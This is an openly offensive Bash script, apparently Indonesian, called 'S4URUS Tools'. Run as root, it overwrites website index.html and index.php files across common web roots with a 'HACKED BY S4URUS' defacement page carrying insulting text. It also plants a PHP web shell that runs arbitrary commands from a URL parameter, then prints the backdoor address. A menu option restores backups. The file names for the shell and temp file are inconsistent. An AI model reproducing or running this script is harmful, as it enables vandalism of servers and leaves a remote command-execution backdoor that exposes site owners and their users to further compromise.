#!/bin/bash

# ==============================================
# S4URUS TOOLS - DEFACE & PULIHKAN
# [ S4URUS 2 Menu ]
# ==============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ==============================================
# KONFIGURASI
# ==============================================
BACKUP_DIR="/root/backup_web_$(date +%Y%m%d_%H%M%S)"
IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')

# ==============================================
# HTML DEFACE - PWND BY S4URUS
# ==============================================
HTML_CONTENT='<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" type="image/png" href="https://files.catbox.moe/4jii2v.png" />
  <title>HACKED BY S4URUS - SYSTEM BREAK</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Orbitron", sans-serif;
      background-color: #000;
      background-image: url("https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1470&auto=format&fit=crop");
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-blend-mode: multiply;
      color: #00ff00;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
      overflow: hidden;
      position: relative;
    }

    #tsparticles {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
    }

    .content-wrapper {
      position: relative;
      z-index: 10;
      padding: 20px;
      width: 100%;
      max-width: 1200px;
      animation: fadeIn 1.5s ease-out;
    }

    @keyframes fadeIn {
      0% { opacity: 0; transform: scale(0.95); }
      100% { opacity: 1; transform: scale(1); }
    }

    .glitch {
      font-size: clamp(2rem, 7vw, 5rem);
      font-weight: 700;
      color: #ffffff;
      position: relative;
      text-transform: uppercase;
      text-shadow: 4px 4px 0px #000000, 0 0 20px #00ff00;
      margin-bottom: 20px;
      white-space: nowrap;
      letter-spacing: 5px;
    }

    @media (max-width: 550px) {
      .glitch {
        white-space: normal;
        line-height: 1.2;
        font-size: clamp(1.8rem, 8vw, 3rem);
      }
    }

    .terminal-text {
      font-family: "Share Tech Mono", monospace;
      font-size: clamp(1.1rem, 2.8vw, 1.8rem);
      color: #00ff00;
      text-shadow: 2px 2px 0px #000000, 0 0 15px #0f0;
      margin-bottom: 30px;
      letter-spacing: 3px;
      text-transform: uppercase;
      background: rgba(0,0,0,0.6);
      display: inline-block;
      padding: 10px 20px;
      border-radius: 4px;
      border-left: 4px solid #00ff00;
      border-right: 4px solid #00ff00;
    }

    .line {
      width: 180px;
      height: 3px;
      background: linear-gradient(90deg, transparent, #00ff00, #00ff00, #00ff00, transparent);
      margin: 15px auto 30px auto;
      box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00;
    }

    .signature {
      font-family: "Share Tech Mono", monospace;
      font-size: 1.2rem;
      color: #fff;
      text-shadow: 0 0 5px #00ff00, 2px 2px 0 #000;
      opacity: 0.9;
      margin-top: 60px;
      background: rgba(0,0,0,0.5);
      padding: 12px 25px;
      display: inline-block;
      border-radius: 30px;
      border: 1px solid #00ff00;
      backdrop-filter: blur(2px);
    }

    .glitch::before,
    .glitch::after {
      content: attr(data-text);
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: transparent;
      overflow: hidden;
    }

    .glitch::before {
      left: 3px;
      text-shadow: -3px 0 #ff00c1;
      animation: glitch-anim-1 2.4s infinite linear alternate-reverse;
    }

    .glitch::after {
      left: -3px;
      text-shadow: -3px 0 #00fff9;
      animation: glitch-anim-2 2.8s infinite linear alternate;
    }

    @keyframes glitch-anim-1 {
      0% { clip: rect(15px, 9999px, 8px, 0); }
      10% { clip: rect(70px, 9999px, 65px, 0); }
      20% { clip: rect(40px, 9999px, 30px, 0); }
      30% { clip: rect(90px, 9999px, 95px, 0); }
      40% { clip: rect(25px, 9999px, 45px, 0); }
      50% { clip: rect(55px, 9999px, 75px, 0); }
      60% { clip: rect(80px, 9999px, 85px, 0); }
      70% { clip: rect(10px, 9999px, 22px, 0); }
      80% { clip: rect(48px, 9999px, 58px, 0); }
      90% { clip: rect(68px, 9999px, 38px, 0); }
      100% { clip: rect(88px, 9999px, 18px, 0); }
    }

    @keyframes glitch-anim-2 {
      0% { clip: rect(62px, 9999px, 92px, 0); }
      15% { clip: rect(33px, 9999px, 12px, 0); }
      25% { clip: rect(77px, 9999px, 57px, 0); }
      35% { clip: rect(22px, 9999px, 42px, 0); }
      45% { clip: rect(99px, 9999px, 79px, 0); }
      55% { clip: rect(11px, 9999px, 31px, 0); }
      65% { clip: rect(49px, 9999px, 69px, 0); }
      75% { clip: rect(81px, 9999px, 21px, 0); }
      85% { clip: rect(29px, 9999px, 49px, 0); }
      95% { clip: rect(73px, 9999px, 93px, 0); }
      100% { clip: rect(5px, 9999px, 25px, 0); }
    }

    .audio-hint {
      font-size: 0.8rem;
      color: #00cc00;
      margin-top: 10px;
      opacity: 0.6;
      letter-spacing: 1px;
    }
  </style>
</head>
<body>

  <audio id="musik" autoplay muted loop>
    <source src="https://files.catbox.moe/fr23wu.mp3" type="audio/mpeg" />
  </audio>

  <div id="tsparticles"></div>

  <div class="content-wrapper">
    <h1 class="glitch" data-text="HACKED BY S4URUS">
      HACKED BY S4URUS
    </h1>

    <div class="line"></div>

    <p class="terminal-text">
      VPS LU KENAPA BANG, WKWKWKWKğŸ˜¹
    </p>

    <div class="signature">
      [ FUCK YOU ğŸ–•ğŸ–• ]<br />
      ~ S4URUS Was Here ~
    </div>

    <div class="audio-hint">
      ( HAMA INDONESIA BISA APA LUU ?)
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/tsparticles-slim@2.0.6/tsparticles.slim.bundle.min.js"></script>
  <script>
    (function() {
      tsParticles.load("tsparticles", {
        fpsLimit: 60,
        background: { color: "transparent" },
        particles: {
          number: { value: 70, density: { enable: true, area: 800 } },
          color: { value: "#00ff00" },
          shape: { type: ["edge", "circle"] },
          opacity: { value: 0.7, random: true, anim: { enable: true, speed: 0.8, minimumValue: 0.2 } },
          size: { value: { min: 1, max: 4 }, random: true, animation: { enable: true, speed: 2, minimumValue: 0.5 } },
          links: { enable: true, distance: 150, color: "#00ff00", opacity: 0.3, width: 1 },
          move: { enable: true, speed: 1.2, direction: "none", random: true, straight: false, outModes: { default: "out" } }
        },
        interactivity: {
          detectsOn: "window",
          events: {
            onHover: { enable: true, mode: "repulse" },
            onClick: { enable: true, mode: "push" },
            resize: true
          },
          modes: {
            repulse: { distance: 100, duration: 0.4 },
            push: { quantity: 3 }
          }
        },
        detectRetina: true
      });

      const audio = document.getElementById("musik");

      function enableAudio() {
        if (audio) {
          audio.muted = false;
          audio.play().catch(e => {});
        }
        document.removeEventListener("click", enableAudio);
        document.removeEventListener("touchstart", enableAudio);
      }

      document.addEventListener("click", enableAudio);
      document.addEventListener("touchstart", enableAudio);
    })();
  </script>
</body>
</html>'

# ==============================================
# HEADER
# ==============================================
show_header() {
    clear
    echo -e "${RED}"
    echo "    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
    echo "    â•‘              S4URUS TOOLS - DEFACE & PULIHKAN             â•‘"
    echo "    â•‘                    [ TOOLS BY S4URUS ]                     â•‘"
    echo "    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo -e "${NC}"
    echo -e "${CYAN}ğŸ“¡ IP VPS: ${GREEN}$IP_VPS${NC}"
    echo ""
}

# ==============================================
# FUNGSI BACKUP
# ==============================================
backup_files() {
    echo -e "\n${YELLOW}[â€¢] Membackup file website...${NC}"
    mkdir -p "$BACKUP_DIR"
    
    # Cari file index.html dan index.php
    find / -type f \( -name "index.html" -o -name "index.php" -o -name "*.blade.php" \) 2>/dev/null | while read file; do
        if [ -f "$file" ]; then
            backup_path="$BACKUP_DIR$(echo "$file" | sed 's|/|_|g')"
            cp "$file" "$backup_path" 2>/dev/null
            echo -e "${GREEN}    âœ… Backup: $file${NC}"
        fi
    done
    
    # Backup juga file konfigurasi penting
    [ -f "/etc/nginx/nginx.conf" ] && cp "/etc/nginx/nginx.conf" "$BACKUP_DIR/nginx.conf" 2>/dev/null
    [ -f "/etc/apache2/apache2.conf" ] && cp "/etc/apache2/apache2.conf" "$BACKUP_DIR/apache2.conf" 2>/dev/null
    
    echo -e "\n${GREEN}âœ… Backup selesai di: $BACKUP_DIR${NC}"
}

# ==============================================
# FUNGSI DEFACE
# ==============================================
deface() {
    echo -e "\n${PURPLE}ğŸ¨ ====== DEFACE WEBSITE ====== ğŸ¨${NC}"
    
    # Backup dulu sebelum deface
    backup_files
    
    # Simpan HTML ke file sementara
    echo "$HTML_CONTENT" > /tmp/s4urus.html
    
    echo -e "\n${YELLOW}[â€¢] Mencari target deface...${NC}"
    
    # Lokasi umum website
    TARGETS=(
        "/var/www/html/index.html"
        "/var/www/html/index.php"
        "/var/www/pterodactyl/public/index.html"
        "/var/www/pterodactyl/public/index.php"
        "/home/*/public_html/index.html"
        "/home/*/public_html/index.php"
        "/usr/local/www/index.html"
        "/opt/lampp/htdocs/index.html"
        "/var/www/nginx/html/index.html"
    )
    
    COUNT=0
    for target in "${TARGETS[@]}"; do
        eval "for f in $target; do
            if [ -f \"\$f\" ]; then
                cp /tmp/s4urus.html \"\$f\" 2>/dev/null
                echo -e \"${GREEN}    âœ… \$f${NC}\"
                ((COUNT++))
            fi
        done" 2>/dev/null
    done
    
    # Cari file index lainnya
    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -30 | while read file; do
        if [ -f "$file" ] && [ -w "$file" ]; then
            cp /tmp/s4urus.html "$file" 2>/dev/null
            echo -e "${GREEN}    âœ… $file${NC}"
            ((COUNT++))
        fi
    done
    
    echo -e "\n${GREEN}âœ… Total $COUNT file berhasil dideface!${NC}"
    
    # Info backdoor sederhana
    echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>" > /var/www/html/r3ndzz.php 2>/dev/null
    echo -e "\n${CYAN}ğŸ”— Backdoor: http://$IP_VPS/s4urus.php?cmd=id${NC}"
    
    rm -f /tmp/r3ndzz.html
}

# ==============================================
# FUNGSI PULIHKAN
# ==============================================
pulihkan() {
    echo -e "\n${BLUE}ğŸ”„ ====== PULIHKAN WEBSITE ====== ğŸ”„${NC}"
    
    # Cari semua backup
    BACKUPS=($(ls -d /root/backup_web_* 2>/dev/null))
    
    if [ ${#BACKUPS[@]} -eq 0 ]; then
        echo -e "${RED}âŒ Tidak ada backup ditemukan!${NC}"
        return
    fi
    
    echo -e "${YELLOW}Pilih backup yang ingin dipulihkan:${NC}"
    for i in "${!BACKUPS[@]}"; do
        echo -e "${GREEN}[$i]${NC} ${BACKUPS[$i]}"
    done
    
    echo -ne "\n${CYAN}Pilih nomor backup: ${NC}"
    read choice
    
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -lt "${#BACKUPS[@]}" ]; then
        SELECTED="${BACKUPS[$choice]}"
        
        echo -e "\n${YELLOW}[â€¢] Memulihkan dari $SELECTED...${NC}"
        
        # Restore file backup
        find "$SELECTED" -type f | while read backup; do
            filename=$(basename "$backup")
            # Cari file asli berdasarkan pattern
            original_path=$(find / -name "*${filename#*_}" 2>/dev/null | head -1)
            if [ -n "$original_path" ]; then
                cp "$backup" "$original_path" 2>/dev/null
                echo -e "${GREEN}    âœ… Pulihkan: $original_path${NC}"
            fi
        done
        
        echo -e "\n${GREEN}âœ… Pemulihan selesai!${NC}"
    else
        echo -e "${RED}Pilihan tidak valid!${NC}"
    fi
}

# ==============================================
# FUNGSI SHOW MENU
# ==============================================
show_menu() {
    show_header
    
    echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${WHITE}â•‘                 MENU UTAMA                     â•‘${NC}"
    echo -e "${WHITE}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[1]${NC} ğŸ¨  DEFACE WEBSITE                   ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[2]${NC} ğŸ”„  PULIHKAN WEBSITE                 ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[0]${NC} ğŸšª  KELUAR                           ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -ne "${YELLOW}â¤ Pilih menu [0-2]: ${NC}"
}

# ==============================================
# CEK ROOT
# ==============================================
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}âŒ Harus root! Jalankan dengan sudo.${NC}"
   exit 1
fi

# ==============================================
# MAIN LOOP
# ==============================================
while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            deface
            ;;
        2)
            pulihkan
            ;;
        0)
            echo -e "\n${GREEN}Terima kasih telah menggunakan S4URUS Tools!${NC}"
            echo -e "${CYAN}ğŸ”¥ PWND BY S4URUS ğŸ”¥${NC}\n"
            exit 0
            ;;
        *)
            echo -e "\n${RED}Pilihan tidak valid!${NC}"
            ;;
    esac
    
    echo ""
    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
    read
done
